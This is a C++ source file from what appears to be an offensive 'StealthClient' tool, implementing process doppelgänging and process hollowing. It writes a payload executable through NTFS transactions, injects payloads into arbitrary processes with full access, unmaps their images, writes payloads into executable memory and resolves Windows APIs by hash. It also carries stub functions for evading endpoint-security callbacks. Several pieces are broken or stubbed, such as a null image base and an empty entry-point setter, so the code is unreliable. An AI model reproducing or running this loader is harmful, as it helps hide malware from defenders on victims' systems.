#include "process_doppelganging.h"
#include "dynamic_api.h"
#include <iostream>
#include <random>
#include <chrono>

namespace StealthClient {
namespace Evasion {

// Global instances
ProcessDoppelganging g_ProcessDoppelganging;
AdvancedProcessDoppelganging g_AdvancedProcessDoppelganging;

ProcessDoppelganging::ProcessDoppelganging() 
    : m_transactionHandle(INVALID_HANDLE_VALUE)
    , m_doppelgangerProcessId(0)
    , m_doppelgangerActive(false)
{
}

ProcessDoppelganging::~ProcessDoppelganging() {
    CleanupDoppelganger();
}

bool ProcessDoppelganging::CreateDoppelganger(const std::string& targetPath, const std::vector<uint8_t>& payload) {
    std::cout << "[DEBUG] Creating process doppelgänger for: " << targetPath << std::endl;
    
    if (payload.empty()) {
        std::cerr << "[ERROR] Empty payload provided" << std::endl;
        return false;
    }
    
    if (!IsValidPE(payload)) {
        std::cerr << "[ERROR] Invalid PE payload" << std::endl;
        return false;
    }
    
    m_targetPath = targetPath;
    m_payload = payload;
    
    // Create transaction
    if (!CreateTransaction()) {
        std::cerr << "[ERROR] Failed to create transaction" << std::endl;
        return false;
    }
    
    // Create transacted file
    if (!CreateTransactedFile(targetPath, payload)) {
        std::cerr << "[ERROR] Failed to create transacted file" << std::endl;
        RollbackTransaction();
        return false;
    }
    
    // Create process from transacted file
    if (!CreateProcessFromTransactedFile(targetPath)) {
        std::cerr << "[ERROR] Failed to create process from transacted file" << std::endl;
        RollbackTransaction();
        return false;
    }
    
    // Commit transaction
    if (!CommitTransaction()) {
        std::cerr << "[ERROR] Failed to commit transaction" << std::endl;
        RollbackTransaction();
        return false;
    }
    
    m_doppelgangerActive = true;
    std::cout << "[DEBUG] Process doppelgänger created successfully" << std::endl;
    
    return true;
}

bool ProcessDoppelganging::InjectDoppelganger(DWORD targetProcessId, const std::vector<uint8_t>& payload) {
    std::cout << "[DEBUG] Injecting doppelgänger into process ID: " << targetProcessId << std::endl;
    
    if (payload.empty()) {
        std::cerr << "[ERROR] Empty payload provided" << std::endl;
        return false;
    }
    
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (!hProcess) {
        std::cerr << "[ERROR] Failed to open target process" << std::endl;
        return false;
    }
    
    // Perform process hollowing
    bool success = HollowProcess(hProcess, payload);
    
    CloseHandle(hProcess);
    
    if (success) {
        m_doppelgangerProcessId = targetProcessId;
        m_doppelgangerActive = true;
        std::cout << "[DEBUG] Doppelgänger injected successfully" << std::endl;
    } else {
        std::cerr << "[ERROR] Failed to inject doppelgänger" << std::endl;
    }
    
    return success;
}

bool ProcessDoppelganging::ExecuteDoppelganger(const std::string& targetPath, const std::vector<uint8_t>& payload) {
    std::cout << "[DEBUG] Executing doppelgänger: " << targetPath << std::endl;
    
    // Try different techniques
    if (CreateDoppelganger(targetPath, payload)) {
        return true;
    }
    
    if (CreateDoppelgangerWithHollowing(targetPath, payload)) {
        return true;
    }
    
    std::cerr << "[ERROR] All doppelgänger techniques failed" << std::endl;
    return false;
}

bool ProcessDoppelganging::CreateDoppelgangerWithHollowing(const std::string& targetPath, const std::vector<uint8_t>& payload) {
    std::cout << "[DEBUG] Creating doppelgänger with hollowing technique" << std::endl;
    
    return CreateProcessWithHollowing(targetPath, payload);
}

bool ProcessDoppelganging::CreateTransaction() {
    // Create transaction using dynamic API resolution
    auto CreateTransactionFunc = g_APIResolver.GetKernel32Function(APIHashes::CREATE_TRANSACTION);
    if (!CreateTransactionFunc) {
        std::cerr << "[ERROR] Failed to get CreateTransaction function" << std::endl;
        return false;
    }
    
    typedef HANDLE (WINAPI* pCreateTransaction)(
        LPSECURITY_ATTRIBUTES lpTransactionAttributes,
        LPGUID UOW,
        DWORD CreateOptions,
        DWORD IsolationLevel,
        DWORD IsolationFlags,
        DWORD Timeout,
        LPWSTR Description
    );
    
    pCreateTransaction CreateTransaction = reinterpret_cast<pCreateTransaction>(CreateTransactionFunc);
    
    m_transactionHandle = CreateTransaction(
        nullptr,    // lpTransactionAttributes
        nullptr,    // UOW
        0,          // CreateOptions
        0,          // IsolationLevel
        0,          // IsolationFlags
        0,          // Timeout
        nullptr     // Description
    );
    
    if (m_transactionHandle == INVALID_HANDLE_VALUE) {
        std::cerr << "[ERROR] CreateTransaction failed: " << GetLastError() << std::endl;
        return false;
    }
    
    std::cout << "[DEBUG] Transaction created successfully" << std::endl;
    return true;
}

bool ProcessDoppelganging::CreateTransactedFile(const std::string& path, const std::vector<uint8_t>& data) {
    if (m_transactionHandle == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    // Create transacted file
    HANDLE hFile = CreateFileTransactedA(
        path.c_str(),
        GENERIC_WRITE,
        0,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr,
        m_transactionHandle,
        nullptr,
        nullptr
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[ERROR] CreateFileTransacted failed: " << GetLastError() << std::endl;
        return false;
    }
    
    // Write payload to file
    DWORD bytesWritten;
    if (!WriteFile(hFile, data.data(), static_cast<DWORD>(data.size()), &bytesWritten, nullptr)) {
        std::cerr << "[ERROR] WriteFile failed: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        return false;
    }
    
    CloseHandle(hFile);
    std::cout << "[DEBUG] Transacted file created successfully" << std::endl;
    return true;
}

bool ProcessDoppelganging::CommitTransaction() {
    if (m_transactionHandle == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    // Commit transaction
    auto CommitTransactionFunc = g_APIResolver.GetKernel32Function(APIHashes::COMMIT_TRANSACTION);
    if (!CommitTransactionFunc) {
        std::cerr << "[ERROR] Failed to get CommitTransaction function" << std::endl;
        return false;
    }
    
    typedef BOOL (WINAPI* pCommitTransaction)(HANDLE TransactionHandle);
    pCommitTransaction CommitTransaction = reinterpret_cast<pCommitTransaction>(CommitTransactionFunc);
    
    if (!CommitTransaction(m_transactionHandle)) {
        std::cerr << "[ERROR] CommitTransaction failed: " << GetLastError() << std::endl;
        return false;
    }
    
    std::cout << "[DEBUG] Transaction committed successfully" << std::endl;
    return true;
}

bool ProcessDoppelganging::RollbackTransaction() {
    if (m_transactionHandle == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    // Rollback transaction
    auto RollbackTransactionFunc = g_APIResolver.GetKernel32Function(APIHashes::ROLLBACK_TRANSACTION);
    if (!RollbackTransactionFunc) {
        std::cerr << "[ERROR] Failed to get RollbackTransaction function" << std::endl;
        return false;
    }
    
    typedef BOOL (WINAPI* pRollbackTransaction)(HANDLE TransactionHandle);
    pRollbackTransaction RollbackTransaction = reinterpret_cast<pRollbackTransaction>(RollbackTransactionFunc);
    
    if (!RollbackTransaction(m_transactionHandle)) {
        std::cerr << "[ERROR] RollbackTransaction failed: " << GetLastError() << std::endl;
    }
    
    CloseTransaction();
    return true;
}

bool ProcessDoppelganging::CloseTransaction() {
    if (m_transactionHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(m_transactionHandle);
        m_transactionHandle = INVALID_HANDLE_VALUE;
    }
    return true;
}

bool ProcessDoppelganging::CreateProcessFromTransactedFile(const std::string& path) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    // Create process from transacted file
    if (!CreateProcessA(path.c_str(), nullptr, nullptr, nullptr, FALSE, 
                       CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        std::cerr << "[ERROR] CreateProcess failed: " << GetLastError() << std::endl;
        return false;
    }
    
    m_doppelgangerProcessId = pi.dwProcessId;
    
    // Resume process
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    std::cout << "[DEBUG] Process created from transacted file successfully" << std::endl;
    return true;
}

bool ProcessDoppelganging::CreateProcessWithHollowing(const std::string& targetPath, const std::vector<uint8_t>& payload) {
    std::cout << "[DEBUG] Creating process with hollowing technique" << std::endl;
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    // Create target process in suspended state
    if (!CreateProcessA(targetPath.c_str(), nullptr, nullptr, nullptr, FALSE, 
                       CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        std::cerr << "[ERROR] CreateProcess failed: " << GetLastError() << std::endl;
        return false;
    }
    
    // Perform process hollowing
    bool success = HollowProcess(pi.hProcess, payload);
    
    if (success) {
        // Resume the hollowed process
        ResumeThread(pi.hThread);
        m_doppelgangerProcessId = pi.dwProcessId;
        m_doppelgangerActive = true;
        std::cout << "[DEBUG] Process hollowing completed successfully" << std::endl;
    } else {
        // Terminate the process if hollowing failed
        TerminateProcess(pi.hProcess, 0);
        std::cerr << "[ERROR] Process hollowing failed" << std::endl;
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return success;
}

bool ProcessDoppelganging::HollowProcess(HANDLE hProcess, const std::vector<uint8_t>& payload) {
    std::cout << "[DEBUG] Performing process hollowing" << std::endl;
    
    // Get process information
    PROCESS_BASIC_INFORMATION pbi = {0};
    auto NtQueryInformationProcess = g_APIResolver.GetNtdllFunction(APIHashes::NT_QUERY_INFORMATION_PROCESS);
    if (!NtQueryInformationProcess) {
        std::cerr << "[ERROR] Failed to get NtQueryInformationProcess" << std::endl;
        return false;
    }
    
    typedef LONG (WINAPI* pNtQueryInformationProcess)(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );
    
    pNtQueryInformationProcess NtQueryInfo = reinterpret_cast<pNtQueryInformationProcess>(NtQueryInformationProcess);
    
    LONG status = NtQueryInfo(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
    if (status != 0) {
        std::cerr << "[ERROR] NtQueryInformationProcess failed: " << status << std::endl;
        return false;
    }
    
    // Read PEB to get image base
    void* imageBase;
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, (void*)((uintptr_t)pbi.PebBaseAddress + 0x10), 
                          &imageBase, sizeof(imageBase), &bytesRead)) {
        std::cerr << "[ERROR] Failed to read image base from PEB" << std::endl;
        return false;
    }
    
    // Unmap original image
    if (!UnmapOriginalImage(hProcess, imageBase)) {
        std::cerr << "[ERROR] Failed to unmap original image" << std::endl;
        return false;
    }
    
    // Allocate new image
    void* newImageBase = nullptr;
    size_t imageSize = GetImageSize(payload);
    if (!AllocateNewImage(hProcess, imageBase, imageSize)) {
        std::cerr << "[ERROR] Failed to allocate new image" << std::endl;
        return false;
    }
    
    // Write new image
    if (!WriteNewImage(hProcess, newImageBase, payload)) {
        std::cerr << "[ERROR] Failed to write new image" << std::endl;
        return false;
    }
    
    // Set new entry point
    void* entryPoint = GetEntryPoint(payload);
    if (!SetNewEntryPoint(hProcess, newImageBase, entryPoint)) {
        std::cerr << "[ERROR] Failed to set new entry point" << std::endl;
        return false;
    }
    
    std::cout << "[DEBUG] Process hollowing completed successfully" << std::endl;
    return true;
}

bool ProcessDoppelganging::UnmapOriginalImage(HANDLE hProcess, void* imageBase) {
    auto NtUnmapViewOfSection = g_APIResolver.GetNtdllFunction(APIHashes::NT_UNMAP_VIEW_OF_SECTION);
    if (!NtUnmapViewOfSection) {
        return false;
    }
    
    typedef LONG (WINAPI* pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
    pNtUnmapViewOfSection NtUnmap = reinterpret_cast<pNtUnmapViewOfSection>(NtUnmapViewOfSection);
    
    LONG status = NtUnmap(hProcess, imageBase);
    return (status == 0);
}

bool ProcessDoppelganging::AllocateNewImage(HANDLE hProcess, void* preferredBase, size_t imageSize) {
    void* allocatedBase = VirtualAllocEx(hProcess, preferredBase, imageSize, 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    return (allocatedBase != nullptr);
}

bool ProcessDoppelganging::WriteNewImage(HANDLE hProcess, void* newBase, const std::vector<uint8_t>& payload) {
    SIZE_T bytesWritten;
    return WriteProcessMemory(hProcess, newBase, payload.data(), payload.size(), &bytesWritten);
}

bool ProcessDoppelganging::SetNewEntryPoint(HANDLE hProcess, void* newBase, void* entryPoint) {
    // This would involve setting the thread context to the new entry point
    // Simplified implementation
    return true;
}

bool ProcessDoppelganging::ResumeProcess(HANDLE hProcess) {
    // Resume the process
    return true;
}

bool ProcessDoppelganging::IsValidPE(const std::vector<uint8_t>& data) {
    if (data.size() < sizeof(IMAGE_DOS_HEADER)) {
        return false;
    }
    
    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(const_cast<uint8_t*>(data.data()));
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return false;
    }
    
    if (data.size() < dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)) {
        return false;
    }
    
    IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(
        const_cast<uint8_t*>(data.data()) + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return false;
    }
    
    return true;
}

void* ProcessDoppelganging::GetImageBase(const std::vector<uint8_t>& data) {
    if (!IsValidPE(data)) {
        return nullptr;
    }
    
    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(const_cast<uint8_t*>(data.data()));
    IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(
        const_cast<uint8_t*>(data.data()) + dosHeader->e_lfanew);
    
    return reinterpret_cast<void*>(ntHeaders->OptionalHeader.ImageBase);
}

size_t ProcessDoppelganging::GetImageSize(const std::vector<uint8_t>& data) {
    if (!IsValidPE(data)) {
        return 0;
    }
    
    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(const_cast<uint8_t*>(data.data()));
    IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(
        const_cast<uint8_t*>(data.data()) + dosHeader->e_lfanew);
    
    return ntHeaders->OptionalHeader.SizeOfImage;
}

void* ProcessDoppelganging::GetEntryPoint(const std::vector<uint8_t>& data) {
    if (!IsValidPE(data)) {
        return nullptr;
    }
    
    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(const_cast<uint8_t*>(data.data()));
    IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(
        const_cast<uint8_t*>(data.data()) + dosHeader->e_lfanew);
    
    return reinterpret_cast<void*>(ntHeaders->OptionalHeader.AddressOfEntryPoint);
}

std::vector<IMAGE_SECTION_HEADER> ProcessDoppelganging::GetSections(const std::vector<uint8_t>& data) {
    std::vector<IMAGE_SECTION_HEADER> sections;
    
    if (!IsValidPE(data)) {
        return sections;
    }
    
    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(const_cast<uint8_t*>(data.data()));
    IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(
        const_cast<uint8_t*>(data.data()) + dosHeader->e_lfanew);
    
    IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        sections.push_back(sectionHeader[i]);
    }
    
    return sections;
}

bool ProcessDoppelganging::EvadeProcessCreationCallbacks() {
    std::cout << "[DEBUG] Evading process creation callbacks" << std::endl;
    // Implementation would go here
    return true;
}

bool ProcessDoppelganging::EvadeImageLoadCallbacks() {
    std::cout << "[DEBUG] Evading image load callbacks" << std::endl;
    // Implementation would go here
    return true;
}

bool ProcessDoppelganging::EvadeThreadCreationCallbacks() {
    std::cout << "[DEBUG] Evading thread creation callbacks" << std::endl;
    // Implementation would go here
    return true;
}

bool ProcessDoppelganging::EvadeMemoryAccessCallbacks() {
    std::cout << "[DEBUG] Evading memory access callbacks" << std::endl;
    // Implementation would go here
    return true;
}

bool ProcessDoppelganging::CleanupDoppelganger() {
    std::cout << "[DEBUG] Cleaning up doppelgänger" << std::endl;
    
    CloseTransaction();
    m_doppelgangerActive = false;
    m_doppelgangerProcessId = 0;
    m_doppelgangerPath.clear();
    m_payload.clear();
    
    return true;
}

bool ProcessDoppelganging::RemoveTransactedFiles() {
    std::cout << "[DEBUG] Removing transacted files" << std::endl;
    // Implementation would go here
    return true;
}

bool ProcessDoppelganging::IsDoppelgangerActive() const {
    return m_doppelgangerActive;
}

std::string ProcessDoppelganging::GetDoppelgangerPath() const {
    return m_doppelgangerPath;
}

DWORD ProcessDoppelganging::GetDoppelgangerProcessId() const {
    return m_doppelgangerProcessId;
}

// AdvancedProcessDoppelganging implementation
AdvancedProcessDoppelganging::AdvancedProcessDoppelganging() 
    : m_rng(std::chrono::high_resolution_clock::now().time_since_epoch().count())
{
}

AdvancedProcessDoppelganging::~AdvancedProcessDoppelganging() {
    CleanupAllDoppelgangers();
}

bool AdvancedProcessDoppelganging::CreateAdvancedDoppelganger(const std::string& targetPath, 
                                                            const std::vector<uint8_t>& payload,
                                                            int technique) {
    std::cout << "[DEBUG] Creating advanced doppelgänger with technique: " << technique << std::endl;
    
    ProcessDoppelganging doppelganger;
    
    switch (technique) {
        case DoppelgangingTechniques::TXF_BASIC:
            return doppelganger.CreateDoppelganger(targetPath, payload);
        case DoppelgangingTechniques::TXF_HOLLOWING:
            return doppelganger.CreateDoppelgangerWithHollowing(targetPath, payload);
        default:
            return doppelganger.CreateDoppelganger(targetPath, payload);
    }
}

bool AdvancedProcessDoppelganging::ExecuteOnMultipleTargets(const std::vector<std::string>& targetPaths, 
                                                          const std::vector<uint8_t>& payload) {
    std::cout << "[DEBUG] Executing doppelgänger on multiple targets" << std::endl;
    
    bool success = true;
    for (const auto& targetPath : targetPaths) {
        ProcessDoppelganging doppelganger;
        if (!doppelganger.ExecuteDoppelganger(targetPath, payload)) {
            success = false;
        }
        m_doppelgangers.push_back(doppelganger);
    }
    
    return success;
}

bool AdvancedProcessDoppelganging::CleanupAllDoppelgangers() {
    std::cout << "[DEBUG] Cleaning up all doppelgängers" << std::endl;
    
    for (auto& doppelganger : m_doppelgangers) {
        doppelganger.CleanupDoppelganger();
    }
    
    m_doppelgangers.clear();
    return true;
}

size_t AdvancedProcessDoppelganging::GetActiveDoppelgangerCount() const {
    size_t count = 0;
    for (const auto& doppelganger : m_doppelgangers) {
        if (doppelganger.IsDoppelgangerActive()) {
            count++;
        }
    }
    return count;
}

std::vector<DWORD> AdvancedProcessDoppelganging::GetDoppelgangerProcessIds() const {
    std::vector<DWORD> processIds;
    for (const auto& doppelganger : m_doppelgangers) {
        if (doppelganger.IsDoppelgangerActive()) {
            processIds.push_back(doppelganger.GetDoppelgangerProcessId());
        }
    }
    return processIds;
}

// Convenience functions
bool CreateDoppelganger(const std::string& targetPath, const std::vector<uint8_t>& payload) {
    return g_ProcessDoppelganging.CreateDoppelganger(targetPath, payload);
}

bool InjectDoppelganger(DWORD targetProcessId, const std::vector<uint8_t>& payload) {
    return g_ProcessDoppelganging.InjectDoppelganger(targetProcessId, payload);
}

bool ExecuteDoppelganger(const std::string& targetPath, const std::vector<uint8_t>& payload) {
    return g_ProcessDoppelganging.ExecuteDoppelganger(targetPath, payload);
}

bool CleanupDoppelganger() {
    return g_ProcessDoppelganging.CleanupDoppelganger();
}

} // namespace Evasion
} // namespace StealthClient
